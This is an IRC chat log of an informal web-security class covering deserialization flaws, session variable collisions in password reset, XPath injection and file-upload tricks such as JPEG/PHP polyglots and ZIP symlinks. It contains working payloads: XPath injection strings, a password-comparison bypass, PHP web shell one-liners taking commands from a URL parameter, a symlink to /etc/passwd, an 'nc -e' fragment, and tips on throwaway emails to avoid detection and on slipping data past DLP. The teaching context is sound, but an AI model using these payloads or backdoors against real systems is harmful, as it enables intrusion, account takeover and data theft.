<@ufurnace> Session variable name collision attacks
<&rackham> logging on
<&rackham> the room is your ufurnace 
<@ufurnace> XPath injection
<@ufurnace> Thank you rackham 
<@ufurnace> And if we have time for other things after those, I'll briefly discuss some neat tricks with file uploads involving file format stuff
<@ufurnace> So, let's begin with deserialization
<@ufurnace> Sometimes, in a program, you have a complex data structure
<@ufurnace> Perhaps an object with several different types of associated data
<@ufurnace> To put this down in a database or file somewhere, or pass it along via a network is not simple without serialization
<@ufurnace> You'd have to take each value and put it in some place with some metadata about how the object is to be restored from this stored state
<@ufurnace> There are a number of ways to do this, some of them more interesting and fully featured than others
<@ufurnace> Let's take a language agnostic example with JSON
<@ufurnace> JSON really only supports strings and numbers and hierarchical data structure
<@ufurnace> But there are more interesting serialization formats with interesting problems
<@ufurnace> Before we get to that, let's talk about PHP serialization, a fairly simple format
<@ufurnace> {s:0:"";s:5:"value";}
<@ufurnace> Let's break this down. There are two key-length-value items here
<@ufurnace> s:0:""
<@ufurnace> String, 0 bytes long, value is ""
<@ufurnace> s:5:"value"
<@ufurnace> String, 5 bytes long, value is "value"
<@ufurnace> Here's something interesting. If we have control of this object, we can change not only the values, but the data types
<@ufurnace> Let's say we have a serialized username and password object in a cookie
<@ufurnace> It might look like {s:4:"user";s:8:"password";}
<@ufurnace> Now, imagine that on every request, the website grabs the password for the username from the database, then checks it against the password from our serialized object
<@ufurnace> Like this:
<@ufurnace> if $pass_from_database == $pass_from_serialized_object { <user is authed> }
<@ufurnace> Can anyone tell me the difference between == and === in PHP?
< cyb3rs3c__> no
< crums> === is same value and same data type
<@ufurnace> Thank you, that's correct crums 
< aix> no i have no clue
<@ufurnace> == means that the data will be converted to whatever types can be compared
<@ufurnace> === means that the comparison will fail for non-matching data types
<@ufurnace> So we can change s:8:"password" to b:true
<@ufurnace> That's boolean, which can only be true or false
<@ufurnace> Unless $pass_from_database is "false", this comparison will always return true
<@ufurnace> But then we can just change our "password" in the object to b:false
<@ufurnace> And we've bypassed the need to have the correct password
<@ufurnace> Now, this is interesting but it's a pretty specific case, isn't it?
<@ufurnace> This is also a fairly primitive serialization format.
<@ufurnace> There are some more interesting features in more robust serialization formats, such as the ability to store functions in serialized objects
<&mona> small PSA: there's a lot of content for ufurnace to cover and not much time to do it in, so pm any questions to me or rackham and we'll vet them
<&mona> Q&A will be more limited than usual today
<@ufurnace> If you have a Java web application that passes objects containing methods to be executed later, you can change the method and give it back, and when the application eventually gets to executing that method, it will execute whatever you chose
<@ufurnace> Now, there are more advanced ways of exploiting Java deserialization, but this is actually where my knowledge stops
<@ufurnace> The interesting thing is that in Java, deserializing an object is the same no matter what kind of object is expected
<@ufurnace> It will create an object of any kind you give it before it says "wait a sec this isn't what I was expecting"
<@ufurnace> There are some objects that, if created in a certain way, result in code execution as soon as deserialization occurs
<@ufurnace> Check out "ysoserial" for a tool that will help you create these
<@ufurnace> Last topic in deserialization is Python pickle
<@ufurnace> This one is pretty easy
<@ufurnace> The pickle serialization format has a built-in method that executes when an object is deserialized
<@ufurnace> Here's the kicker: That method is stored in the object itself!
<@ufurnace> This is the "__reduce__" function
<@ufurnace> You can find a post on creating a Python pickle that will exploit such an issue in this blog post: https://blog.nelhage.com/2011/03/exploiting-pickle/
<@ufurnace> But I won't cover it and leave that as further reading for those interested. I'm going to take a few questions now
< kashloca> what's ysoserial??
<@ufurnace> ysoserial is a tool to create serialized Java objects that, when deserialized by an application, runs whatever shell command you want
<@ufurnace> This works for any place that a Java application deserializes an object of your choice
< Anon64> What language should i learn to help me on this type of exploitation?
< kashloca> okay thanks
<@ufurnace> Anon64: Depends on the language you're working with
< joinjohn> c++ Anon64
< joinjohn> python
< leet> nifty
< joinjohn> sql
<@ufurnace> Serialization formats and how easily exploited they are depend a lot on the particular language
<@ufurnace> So if you want to exploit Python pickle deserialization, learn about Python pickles
<@ufurnace> So let's move on to session variable name collision vulns
< Anon64> ok thanks
<@ufurnace> Now, this shit is really hard to find without having source code, but I'll give a few examples of common places this mistake is made
<@ufurnace> But first, let's explain what this actually is
<@ufurnace> HTTP is the protocol used for web communication (mostly)
<@ufurnace> HTTP, by itself, maintains no state. Every request is made independently of the others.
<@ufurnace> Now, there's keep-alive connections, and Cookies, and all that
<@ufurnace> But how does a web application keep information about you and your login session without passing it back and forth between itself and you?
<@ufurnace> It provides you with a session token, and stores certain data in some framework-specific way in what are referred to as session variables
<@ufurnace> It tells the session variables apart by name
<@ufurnace> Imagine that you have a login system that uses "username" as a session variable name to keep track of who you're logged in as
<@ufurnace> So if your session's "username" variable is "lameuser", you get little access
<@ufurnace> And if it's "godlyadmin" things are more interesting for you
<@ufurnace> Now, imagine that they made a reset password function
<@ufurnace> It works in three stages
<@ufurnace> Step 1: Ask for a username, and check to see if that user exists.
<@ufurnace> Step 2: If the user exists, ask their security questions
<@ufurnace> Step 3: If the questions were answered right, take a new password
<@ufurnace> But how do you know at step 2 what the username was from step 1?
<@ufurnace> Easy, you store it in a session variable
<@ufurnace> And if you're not thinking about it too hard, you might call that variable "username"
<@ufurnace> And that would mean I could log in as "lameuser", then complete step 1 of password reset as "godlyadmin", which would mean I'd be logged in with the session variable "username" set to "godlyadmin"
<&mona> note: don't take away from this "i'm safe if i dont give the vulnerable variable an obvious name"
<@ufurnace> Does this all make sense to everyone?
< Anon64> Yeah
< Dark_Knight> yes
< cyb3rs3c__> yeahs
< gravewalker> yup
< Atom_> ya
< LED> Yes, am following, really enjoying this
< McL0u1s> more or less
<@ufurnace> Okay, let's look at a slightly different application of the same bug
< CM99> yeah
<@ufurnace> So now they get wise and they change the password reset to use "reset_username" as the session variable name
<@ufurnace> Or they force a log out when password reset is started
<@ufurnace> Let's say you go through step 1 with lameuser
<@ufurnace> You answer the questions in step 2 as lameuser, and now you've got these session variables:
<@ufurnace> "reset_username":"lameuser","passed_step1":true,"passed_step2":true
<@ufurnace> But instead of completing step 3 right away, you go back to step 1 and put in "godlyadmin"
<@ufurnace> Now your session variables are:
<@ufurnace> "reset_username":"godlyadmin","passed_step1":true,"passed_step2":true
<@ufurnace> So then you go to step 3 and reset godlyadmin's password
<@ufurnace> We have time to look at one more manifestation of this bug. I actually found this on a govt web app
<@ufurnace> (I was being paid to look at it, but still ;)
<@ufurnace> In some applications, the presence of a session is considered a valid login
<&mona> nice cover
<@ufurnace> Sometimes, the act of setting a session variable causes a framework to say "Oh you haven't got a session, let's set one up for you"
<@ufurnace> So obviously, checking that someone has a session and considering that "good enough" is not smart
<@ufurnace> I brute forced through script names until I got something like "update.php"
<@ufurnace> I never learned exactly why it set a session variable, but all of a sudden, all these scripts I found that were previously redirecting me to the login page suddenly weren't
<@ufurnace> But since I didn't have any session variable tying me to a particular user, I couldn't see any data
<@ufurnace> What I *could* do was to exploit a SQLi flaw that required a valid login
<@ufurnace> Suddenly I had what I needed to get actual data
<@ufurnace> Questions?
< cyb3rs3c__> brute forced through script names ?
< isabelle> what if step 2 is to send email to user to reset pwd, instead of asking security question?
<@ufurnace> Yes
<@ufurnace> cyb3rs3c__: Yes, a tool like DirBuster can guess valid script names on a web site
<@ufurnace> It may discover parts of the application that aren't exposed through any normal means
< cyb3rs3c__> ah yes oke 
< cyb3rs3c__> java app i recall used it before..
<@ufurnace> isabelle: If step 2 is to send an email, you would send the email to yourself, click the link you get, then complete step 1 as godlyadmin
<@ufurnace> Then go back to step 3
<@ufurnace> Ultimately it doesn't matter how they authenticate you in step 2
<@ufurnace> If you can authenticate your own user, you can switch whose password you're resetting by completing step 1 again
< isabelle> whoa would that reveal you've hacked? since it involves your email info
< isabelle> ok
< crums> after getting to step 3 as lameuser - couldn't you use something like burp to modify the request to have username=godlyadmin and newpass=mynewpass instead of going back to step 1?
<@ufurnace> It may, but you would probably want to use someone else's email, or a throwaway like one you'd generate at mailinator.com
< isabelle> ok
<@ufurnace> crums: If they're tracking the username whose password is to be reset using session variables, that data wouldn't be in your hands
<@ufurnace> So Burp wouldn't allow you to change it
<@ufurnace> Session variables are stored server-side
<&mona> session vars != cookies
< crums> ah got it, thanks
<&mona> the sessionid cookie is not the session variable
<@ufurnace> Only the token tying you to a set of variables is stored in your cookie
<&mona> ^
<@ufurnace> Thank you mona :)
<@ufurnace> Okay, so let's get down to XPath injection
<@ufurnace> XPath is a query language for XML documents
<@ufurnace> To be fair, you don't see it very often at all
<@ufurnace> But when you do come across a web site using XPath in an insecure way, it's generally vulnerable to injection attacks
<@ufurnace> In the same way that your input can be mistaken for SQL in an SQL injection attack, the same is possible with XPath
<@ufurnace> So imagine that you have an xml document like this: (this will prolly look ugly af)
<@ufurnace> <xml>
<@ufurnace> <user><username>jeff</username><password>poniesarecool</password></user>
<@ufurnace> <user><username>mona</username><password>ufurnaceiscool</password></user>
<@ufurnace> </xml>
<@ufurnace>  /xml/user[username='jeff' and password='poniesarecool'] would retrieve the first user in that XML blob
<@ufurnace> Now, interestingly, if you came across this situation, you might think you're working with SQLi
<&mona> dont reveal my secret password please
<@ufurnace> Because ' or '1'='1 would still work 
<@ufurnace> mona: doxxd
<@ufurnace> You'd have a situation where your XPath query would be:
<@ufurnace>  /xml/user[username='jeff' and password='' or '1'='1']
<@ufurnace> But if you tried ' or '1'='1'--
<@ufurnace> You'd get a syntax error
<@ufurnace> The part in [ square brackets ] is the condition
<@ufurnace>  /xml/user is the path to the node you want
<@ufurnace> So let's talk about more attacks. What if you don't want to retrieve a user node?
<@ufurnace> As it turns out, path traversal is a thing in XPathi too!
<@ufurnace> You could do ']/../../some/other/nodes['1'='1
<@ufurnace> Which would make your query /xml/user[username='jeff' and password='']/../../some/other/nodes['1'='1']
<@ufurnace> Or, removing the path markers and parent directory markers which cancel each other out
<@ufurnace>  /some/other/nodes['1'='1']
<@ufurnace> And of course, 1=1, so the condition might as well not be there
<@ufurnace> "But ufurnace, I am a lazy skid and I want to comment out instead of trying to balance quotes and brackets and shit"
<@ufurnace> Okay, okay, fine
<@ufurnace> AFAIK there's not really a comment delimiter like -- in XPath
<@ufurnace> However, the most common xml handling library is libxml, which is written in (C? C++?)
<@ufurnace> Some native language
<@ufurnace> Which means that strings terminate with null bytes
<@ufurnace> So if you put in a username of jeff'%00 (a url-encoded null byte)
<@ufurnace> What you get is /xml/user[username='jeff'%00' and password=.....
<@ufurnace> Whoops, that's not right
<@ufurnace> You'd want jeff']%00
<@ufurnace> So basically, /xml/user[username='jeff']%00....junk here....
<@ufurnace> Similar to putting admin';-- in a username for a SQL injectable login form
<&mona> those of you who were at the LFI lesson should have no problem with this technique
<@ufurnace> Now, what about union?
<@ufurnace> As it turns out, yes, there's an analog for XPath
<@ufurnace> It's a pipe char ->   |
<&mona> disgusting
<@ufurnace> So you can do jeff'] | /some/other/nodes %00
<@ufurnace> Which would return the set of nodes for /xml/user[username='jeff'] and /some/other/nodes
<@ufurnace> There's also blind XPath injection, but I'll leave you to research that. Do we want to briefly cover advanced file upload tricks?
<&mona> do it, we have plenty of time
<@ufurnace> Also, questions?
<&mona> the more astute among you may note that ufurnace is givng you a taster of a shitload of useful techniques
<&mona> this lesson will be wasted on you if you dont go and research for yourselves
<@ufurnace> By the way, if you set up a copy of the Magical Code Injection Rainbow from http://github.com/SpiderLabs/MCIR
<@ufurnace> XMLmao will let you practice XPath injection techniques
<@ufurnace> (And XXE, which might be in a future lesson)
< kashloca> what type of apps that use this xpath, i mean what functionalities we can look for
<@ufurnace> kashloca: XML is just another way to store data. You could, for most cases, replace a SQL database with an XML database
< kashloca> okay
<@ufurnace> Okay, so, let's talk about file upload stuff
< isabelle> since it's touching on xml, can this be applied to android apps too...?
< DarkHunter> yes please
<@ufurnace> isabelle: Anything that needs to store data in a database may choose to use an XML based database
<@ufurnace> one sec...
<@ufurnace> Okay
<@ufurnace> So, we're going to talk about some interesting file upload circumstances
<@ufurnace> This assumes that you can already get code exec if you, the student, were placed in front of a file upload script that allows any file with any name drops files in the web root
<&mona> this should be you
<&mona> by now
<@ufurnace> There are a number of ways that developers incorrectly check for the sanity of a file
<@ufurnace> mimetype, which can be changed with burp
<@ufurnace> filename (most common) which is sometimes useful but ultimately not good enough
<@ufurnace> And most people do that wrong
<@ufurnace> And also common but easier to fck with than you'd think: file contents
<@ufurnace> Most people think a file can only be read as one format
<&mona> to reiterate: never trust ANYTHING the user has control of
<@ufurnace> But the truth is, it's just data
<&mona> even if they "shouldn't" ever misuse it
<@ufurnace> As long as it matches the rules for what it should look like, it's fine
<@ufurnace> The rules for what makes something a PHP script is incredibly simple
<@ufurnace> If somewhere in the file, there's a <?php
<@ufurnace> What follows it must be either valid PHP code or ?>
<@ufurnace> Which means that technically, every file that doesn't contain <?php is a valid php script
<@ufurnace> (or in the case of short_tags=On, <?)
<@ufurnace> Imagine an image upload script that checks to see that your uploaded file is a JPG
<@ufurnace> It might give the file to a JPG parser and check the dimensions
<@ufurnace> The way that a comment is represented in a JPG file is just as a series of letters verbatim in the file
<@ufurnace> So what happens if you upload image.php, and the file is a valid JPG with the comment <?php phpinfo(); ?>
<@ufurnace> Fukkin rekt is what happens
<@ufurnace> It passes the test as it is a valid JPEG, but when you try to run it as a PHP script, you get a bunch of junk, followed by the output of phpinfo(), followed by more junk
<@ufurnace> This is known as a "polyglot". A piece of data that matches two or more formats.
<@ufurnace> Another fun trick for parasitic storage
<@ufurnace> (also could be considered steganography)
<@ufurnace> Imagine that you could upload any file that was 30x30 pixels
<@ufurnace> *image
<@ufurnace> When a JPEG parser reaches the magic bytes signifying the end of a JPEG, aka "\xff\xd9"
<@ufurnace> It stops parsing
<@ufurnace> Anything after that is completely ignored
<@ufurnace> When a RAR archive utility looks at a file, it will happily walk through something like 100KB of data looking for the magic bytes that begin a RAR file
<@ufurnace> If you concatenate a RAR file onto the end of a JPEG, it can now be read as both a JPEG and a RAR
<@ufurnace> So you could append some data to the end of a 30x30 JPEG, upload it, and now you have your own personal secret parasitic file storage
< leet> Interesting
<@ufurnace> Any questions so far?
<@ufurnace> Oh, in *nix, to do this on the command line is:
< Anon64> what can I get by uploading a image with php code in it?
< DarkHunter> what tools can be used to embed a malicious php code in a image file ?
<@ufurnace> cat archive.rar >> image.jpg
<@ufurnace> DarkHunter: ImageMagick can be used to add a comment
<@ufurnace> Anon64: You can get code execution
<&mona> php has the passthru, exec, etc. functions
<&mona> that access the shell directly
< leet> ufurnace: make sure to look at the recent imagemagick vuln
<&mona> so php execution = shell
< kashloca> like the one u used mona in lfi class
< leet> it was recently prone to remote code execution
< leet> iirc
<&mona> kashloca: exactly
<@ufurnace> leet: ImageTragick? That shit is hilarity
<&mona> imagetragick is good
<&mona> it flew under the radar a bit
<@ufurnace> It's super basic command injection
< leet> hehe :p 
<&mona> i'm willing to be there's a lot of big vulns out there
<&mona> bet*
<@ufurnace> But in a clever place
< thr33> if I upload this append jpeg to a site, it means someone can download the jpeg, file and all?
<&mona> yeah
< thr33> sweet
<@ufurnace> thr33: Yes, with the caveat that if the image is re-rendered or resized, it will probably throw away everything but the JPEG data
<@ufurnace> Places like imgur, 4chan, etc are already wise to this
< Anon64> So we can use it to communicate secretly with someone
< Anon64> nice
<@ufurnace> I'm sure you can think of lots of interesting uses for this.
< thr33> aah, the purpose i see this for would be to exchange data or extract information, bypassing dlp
<@ufurnace> :)
<@ufurnace> thr33: This also has the effect of bypassing DLP to some degree
< leet> several uses indeed
< McL0u1s> about php in jpg, if the files is checked by format and extension?? is still possible?
<@ufurnace> McL0u1s: If you have extensions checked as well, it's a bit harder
<@ufurnace> Not impossible, though
< leet> You can still embed files into the jpg I believe
< DarkHunter> i know a use. we can add <?php $cmd=$_GET['cmd'] if (isset($cmd)) {system($cmd);} <somehtml code to input and submit>
< leet> if the extension is checked that is, however the receiver will have to know what it actually is iirc
< DarkHunter> and then execute commands on server
<@ufurnace> DarkHunter: Yes, that's the main use case I see :)
<@ufurnace> Now, let's talk about extension blacklisting
<@ufurnace> Imagine an Apache web server with a vulnerable PHP file upload script
<@ufurnace> But it blacklists all the php extensions, php, php3, php4, php5, phtml, phtm
<@ufurnace> One very interesting trick you can use is to upload an .htaccess file
<@ufurnace> McL0u1s asked if it would still be possible if format AND extension were checked
<@ufurnace> I'm not positive, but it may be possible to create a JPEG/htaccess polyglot
<@ufurnace> If so, this could work.
<@ufurnace> Regardless, with an htaccess file we can change what extensions are interpreted as PHP scripts
<@ufurnace> In fact, if you look at the htshells project from wireghoul, they've made .htaccess files that are also valid PHP scripts!
<@ufurnace> And perl scripts, and SSI scripts, etc
<@ufurnace> Seriously, go grab a copy of htshells after class. It's amazing.
<@ufurnace> So, one more trick before I end class. But first, questions?
<@ufurnace> I've heard, btw, that it's possible to do similar things with web.config files on IIS web servers
< Anon64> Where can we get those htshells?
< McL0u1s> can you go into more detail about polyglot jpg htacess?
<@ufurnace> Anon64: Look to the googles
< leet> to the googles -> through the goggles
< thr33> duckduckgo
< leet> Anon64: http://lmgtfy.com/?q=htshells
< Anon64> thanks
<@ufurnace> McL0u1s: It should theoretically possible. One of the challenges is that JPEG parsers expect a valid JPEG header at the start of a file.
< McL0u1s> how make the server read .htacces which is no .htacess??
<@ufurnace> McL0u1s: It would need to have the name ".htaccess" specifically
< McL0u1s> ah ok!
<@ufurnace> And the thing about polyglots is that they are both file formats at once
<@ufurnace> Okay, so one last little trick
<@ufurnace> The ZIP file format allows you to zip up symlinks
<@ufurnace> If you are using infozip on unix and you try to do this you'll need the -y flag
<@ufurnace> Not sure what other zip utilities are capable of making zip files with symlinks, but probably not windows based ones since windows filesystems don't *really* have the concept of symlinks
<@ufurnace> Although that might have changed in really recent windows versions
<@ufurnace> Regardless, this is an interesting property of ZIP files
<@ufurnace> Someone collected a bug bounty from Facebook using this trick!
<@ufurnace> Basically, Facebook allowed you to upload multiple files in a ZIP file and then view them
<@ufurnace> So if you uploaded a ZIP file with a symlink to /etc/passwd you could view /etc/passwd
<@ufurnace> This is more interesting when you have other situations
<@ufurnace> Imagine if you had a place where you could upload a zip file and then edit the contents of the files that were in it
<@ufurnace> Now we're talking arbitrary file write/edit
<@ufurnace> Now, this might not make much sense if you don't know what a symlink is
<@ufurnace> So to wrap it up, a symlink or symbolic link is a pseudo-file
<@ufurnace> It points to another file or directory somewhere else in the file system
<@ufurnace> So if you make a symlink from ./foo to /etc/passwd
<@ufurnace> ln -s /etc/passwd ./foo
<@ufurnace> (I never get the order right, that may be wrong, `man ln` for details)
<@ufurnace> And then you read ./foo
<@ufurnace> cat ./foo
<@ufurnace> You get the contents of /etc/passwd instead
<@ufurnace> So that's the end of the class, except for Q&A.
< smurfer> thanks
< McL0u1s> nice tricks! thanks
<&mona> good shit
< DarkHunter> thank you sir for the class
< thr33> much thanks
< Anon64> Thank you 
<@ufurnace> Welcome :)
< R3lcr4w> thx
< RaveLesson> ufurnace =My new God  
< anonymous> awesome
<@ufurnace> hahaha
<&mona> some people in #man were complaining about difficulty so
<&mona> if you have questions
<&mona> now is the time
< torc> thanks
< aemon> valuable info
< thr33> still trying to understand how we would be able to execute the syms via the site, would we need shell on the server
<@ufurnace> thr33: It depends on how the files are treated by the server
< kashloca> thanks that's very interesting
<@ufurnace> Imagine that you allow editing of uploaded files
<@ufurnace> Upload a symlink to /var/www/backdoor.php
<@ufurnace> Edit it, put in <?php passthru($_GET['cmd']); ?>
<@ufurnace> Go to http://example.com/backdoor.php?cmd=ls
<@ufurnace> ????
<@ufurnace> PROFIT
< thr33> aah, lfi ...
<@ufurnace> Nope, just writing a backdoor into the webroot
<&mona> casually
<@ufurnace> But it's situation specific
< thr33> the scenario i'm playing out mentally, I upload a jpeg with the zipped symlinks and am able to edit the jpeg
< thr33> how do i gain access to the zip and the relevant links
<@ufurnace> For this you'd need a site that would allow the uploading of zip files
<@ufurnace> And that would automatically extract the zip
<@ufurnace> This is distinct from the jpeg polyglot stuff
< thr33> lol, knew i got lost in translation
<@ufurnace> Okay, well that seems like all the questions unless someone is a really slow type
< R3lcr4w> talking about jpeg polyglot stuff can you do it with executable files? and if so, would the exec file be executed if the image is open?
<@ufurnace> Oh there we go
< kashloca> how can someone view a file if it symlinks to /etc/passwd
< kashloca> download it will do the trick ??
< R3lcr4w> lol
<@ufurnace> R3lcr4w: Whether you can make a polyglot depends on the types of files and what the rules are for their formats
<@ufurnace> For instance, you can put a PHP script in pretty much anything
< DarkHunter> in a word file ?
<@ufurnace> The only thing I can think of that you might not be able to do that with is a TrueCrypt/VeraCrypt volume
<@ufurnace> DarkHunter: Yes, docx files are just zip files with lipstick
<&mona> lol
<@ufurnace> Try unzipping a Word document sometime
< thr33> thats fun
<@ufurnace> Zip files have a comment field like JPEGs
< DarkHunter> :o
<@ufurnace> So you can put a PHP script in its zip comment
<&mona> haha, didnt know that
<&mona> that's awesome
< DarkHunter> yeah thats cool
< anonymous> this is great stuff ufurnace, thanks for spending time in here
<&mona> ^
< R3lcr4w> ^
<@ufurnace> You're welcome
< crums> yeah great class, thanks
<&mona> time to close the log?
<@ufurnace> kashloca: Regarding your question
< LED> 
< leet> Thank you very much ufurnace 
<@ufurnace> mona: one sec, lemme clarify on the symlink thing one bit more
<&mona> kk
< leet> thanks, I'd like that
< Parsec> nc -e
< cRzy> hi
<@ufurnace> kashloca: If you have a site that allows you to upload files in a ZIP and then download them again, this is one way you might be able to view arbitrary files
<@ufurnace> Just upload a symlink to the file you want and download it again
<&mona> i.e. facebook
<@ufurnace> mona: Exactly, though they fixed that :)
< cRzy> filezilla is better
< kashloca> thanks ufurnace
<&mona> ok, closing log!
<@ufurnace> Okay, I think we can close the log now. Thanks for attending, yall!
<&mona> everyone thank ufurnace for the excellent class
< R3lcr4w> thx
< anonymous> thanks again
< aemon> thank you! :P
< thr33> much thanks again
< kashloca> ^^
< crums> thanks!
< CM99> great class .thnx
<&mona> the log will be uploaded to the archives shortly
< webanon> Thaks ufurnace
< leet> thanks again
< atilla> Thank you!
< neogeo> Thanks
< LED> thx ufurnace 
< Atom_> thank you master
< leet> Mona has changed Mona to <3
< McL0u1s> thxxxx
< neogeo> great approach ufurnace
< leet> ufurnace: I heard you had other talks, where would I check these out?
< neogeo> thank you all
<@ufurnace> leet: Yeah, I've given a bunch at various cons
<@ufurnace> Many of the slides are collected at http://www.slideshare.net/baronzor
< g0s5> somewhere to see on YT or somewhere?
< g0s5> oh
<@ufurnace> There are videos of my talks on YT too
< g0s5> thx
< leet> thanks ufurnace I'll take a look at them, I might have seen one of your talks if it's been on defcon prior
<@ufurnace> https://www.youtube.com/results?search_query=dan+crowley+security%7Chacking
<@ufurnace> Yeah I've given a few DC talks
< leet> poor punctuation, my bad, but thank you
< leet> Would you mind if I query'd you for a second?
<@ufurnace> Feel free
